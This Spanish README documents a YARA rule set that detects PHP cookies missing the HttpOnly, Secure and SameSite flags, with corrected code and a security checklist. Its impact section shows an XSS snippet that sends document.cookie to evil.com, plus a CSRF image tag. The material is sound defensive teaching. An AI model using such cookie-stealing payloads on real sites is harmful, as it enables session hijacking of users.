# YARA Rule: Cookie Security Flags Detection

## Descripción
Esta regla detecta cookies en PHP que no tienen configurados los flags de seguridad necesarios (HttpOnly, Secure, SameSite), lo cual es una vulnerabilidad crítica especialmente para cookies de autenticación.

## Archivo
`cookie_security_flags.yar`

## Reglas incluidas

### 1. `PHP_Cookie_Without_Security_Flags`
**Severidad:** HIGH  
**CWE:** CWE-614 (Sensitive Cookie Without 'Secure' Attribute), CWE-1004 (Sensitive Cookie Without 'HttpOnly' Flag)

Detecta uso de `setcookie()` sin flags de seguridad:
- `setcookie()` con 2-4 parámetros (sin httponly/secure)
- Cookies de autenticación sin flags
- Nombres de cookies sensibles: auth, session, token, login, etc.

### 2. `PHP_Authentication_Cookie_Insecure`
**Severidad:** CRITICAL  
**CWE:** CWE-614, CWE-1004

Detecta específicamente cookies de autenticación sin seguridad:
- Cookies `auth`, `session`, `token`, `login` sin flags
- Implementaciones simples de setcookie para autenticación

### 3. `PHP_Cookie_HttpOnly_False`
**Severidad:** HIGH  
**CWE:** CWE-1004

Detecta cookies con HttpOnly explícitamente en `false`:
- `setcookie(..., false)` en parámetro 7
- Array de opciones con `'httponly' => false`

### 4. `PHP_Cookie_Secure_False`
**Severidad:** HIGH  
**CWE:** CWE-614

Detecta cookies con Secure flag en `false`:
- Secure flag deshabilitado en parámetro 6
- Array de opciones con `'secure' => false`

### 5. `PHP_Cookie_No_SameSite`
**Severidad:** MEDIUM  
**CWE:** CWE-352 (CSRF)

Detecta cookies sin atributo SameSite:
- `setcookie()` estilo antiguo sin array de opciones
- Cookies de autenticación sin protección CSRF

### 6. `PHP_Session_Cookie_Insecure_Config`
**Severidad:** MEDIUM

Detecta configuración insegura de cookies de sesión:
- `ini_set('session.cookie_httponly', false)`
- `ini_set('session.cookie_secure', false)`
- `ini_set('session.cookie_samesite', 'None')`

## Ejemplos detectados

### login.php y register.php (VULNERABLE)

```php
// ✗ VULNERABLE
setcookie("auth", User::createcookie($_POST['username'], $_POST['password']));
```

**Problemas detectados:**
1. ✗ Solo 2 parámetros (sin expire, path, domain, secure, httponly)
2. ✗ Cookie de autenticación sin HttpOnly (vulnerable a XSS)
3. ✗ Sin Secure flag (puede transmitirse por HTTP sin cifrar)
4. ✗ Sin SameSite (vulnerable a CSRF)

**Riesgos:**

| Flag faltante | Riesgo | Ataque posible |
|--------------|--------|----------------|
| **HttpOnly** | ⚠️ Alto | XSS puede robar cookie vía `document.cookie` |
| **Secure** | ⚠️ Alto | Cookie interceptada en conexión HTTP |
| **SameSite** | ⚠️ Medio | CSRF - sitio malicioso puede usar cookie |

**Solución correcta:**

#### PHP 7.3+ (con array de opciones - RECOMENDADO):
```php
// ✓ CORRECTO
setcookie("auth", User::createcookie($username, $password), [
    'expires' => time() + 3600,
    'path' => '/',
    'domain' => '',
    'secure' => true,      // Solo HTTPS
    'httponly' => true,    // No accesible desde JavaScript
    'samesite' => 'Strict' // Protección CSRF
]);
```

#### PHP < 7.3 (parámetros posicionales):
```php
// ✓ CORRECTO (PHP 5.2+)
setcookie(
    "auth",                                          // name
    User::createcookie($username, $password),        // value
    time() + 3600,                                   // expire
    "/",                                             // path
    "",                                              // domain
    true,                                            // secure
    true                                             // httponly
);
```

## Configuración de Seguridad Recomendada

### Para cookies de autenticación:
```php
$options = [
    'expires' => time() + 3600,     // 1 hora
    'path' => '/',
    'domain' => '',                  // o tu dominio específico
    'secure' => true,                // SIEMPRE true en producción
    'httponly' => true,              // SIEMPRE true para auth
    'samesite' => 'Strict'           // 'Strict' o 'Lax'
];

setcookie('auth', $token, $options);
```

### Para session cookies (php.ini o código):
```php
// Configurar al inicio de la aplicación
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_secure', 1);
ini_set('session.cookie_samesite', 'Strict');

session_start();
```

O en `php.ini`:
```ini
session.cookie_httponly = 1
session.cookie_secure = 1
session.cookie_samesite = Strict
```

## SameSite: ¿Cuál elegir?

| Valor | Protección CSRF | Uso recomendado |
|-------|----------------|-----------------|
| **Strict** | ✅ Máxima | Sitios que no necesitan enlaces externos |
| **Lax** | ✅ Alta | Sitios con enlaces externos (predeterminado) |
| **None** | ❌ Ninguna | Solo si absolutamente necesario + Secure=true |

## Uso de las reglas

### Escanear archivos PHP
```bash
yara cookie_security_flags.yar login.php
yara cookie_security_flags.yar register.php
```

### Escanear directorio completo
```bash
yara -r cookie_security_flags.yar /var/www/html/
```

### Ver matches detallados
```bash
yara -s cookie_security_flags.yar /var/www/html/*.php
```

## Resultados de validación

```
login.php: ✓ DETECTADO
  [PHP_Cookie_Without_Security_Flags]
    • setcookie con 2 parámetros
    • Cookie de autenticación
  [PHP_Authentication_Cookie_Insecure]
    • auth cookie sin flags

register.php: ✓ DETECTADO
  [PHP_Cookie_Without_Security_Flags]
    • setcookie con 2 parámetros
    • Cookie de autenticación
  [PHP_Authentication_Cookie_Insecure]
    • auth cookie sin flags

Total: 8 vulnerabilidades detectadas
```

## Checklist de Seguridad de Cookies

### Cookies de Autenticación/Sesión:
- [ ] HttpOnly = true (OBLIGATORIO)
- [ ] Secure = true (OBLIGATORIO en producción)
- [ ] SameSite = Strict o Lax (OBLIGATORIO)
- [ ] Expire time apropiado (no indefinido)
- [ ] Path restrictivo cuando sea posible
- [ ] Domain específico cuando sea necesario

### Configuración del servidor:
- [ ] HTTPS habilitado en producción
- [ ] HSTS configurado
- [ ] php.ini con session.cookie_* configurado
- [ ] No cookies en HTTP sin Secure flag

### Código:
- [ ] Usar array de opciones (PHP 7.3+)
- [ ] No hardcodear valores de cookies
- [ ] Validar cookies en cada request
- [ ] Regenerar session ID después del login

## Impacto de la vulnerabilidad

### Sin HttpOnly:
```javascript
// ✗ Ataque XSS puede robar cookie
<script>
  fetch('http://evil.com/steal?cookie=' + document.cookie);
</script>
```

### Sin Secure:
```
✗ Cookie interceptada en WiFi público
✗ Man-in-the-middle puede capturar sesión
```

### Sin SameSite:
```html
<!-- ✗ CSRF desde sitio malicioso -->
<img src="https://victim.com/delete-account">
<!-- La cookie de víctima se envía automáticamente -->
```

## Referencias
- [OWASP Top 10 2021: A05 - Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- [CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute](https://cwe.mitre.org/data/definitions/614.html)
- [CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag](https://cwe.mitre.org/data/definitions/1004.html)
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [MDN: Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)